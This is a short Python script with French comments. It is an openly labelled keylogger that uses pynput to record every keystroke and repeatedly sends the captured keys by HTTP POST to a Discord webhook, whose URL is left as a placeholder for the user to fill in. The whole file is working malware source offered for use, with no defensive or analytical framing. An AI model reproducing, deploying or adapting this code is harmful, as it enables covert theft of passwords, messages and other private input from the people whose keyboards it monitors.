from pynput import keyboard
import requests

touche = []

def jsp(key):
    try:
        touche.append(key.char)  
    except AttributeError:
        touche.append(str(key))  

#modifier l'url du webhooks du discord

def envoyer():
    url = 'https://discord.com/api/webhooks/................'
    keylog = {
        "content": " TOUCHE ENVOYE :       ".join(touche)  
    }
    try:
        response = requests.post(url, json=keylog)
        if response.status_code == 204:
            print("GG")
        else:
            print(f"Erreur : {response.status_code}")
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")

def keylogger():
    listener = keyboard.Listener(on_press=jsp)
    listener.start()

    try:
        while True:  
            if len(touche) >= 1:  
                envoyer()
                touche.clear()
    except KeyboardInterrupt:
        print("Keylogger arrêté.")

keylogger()
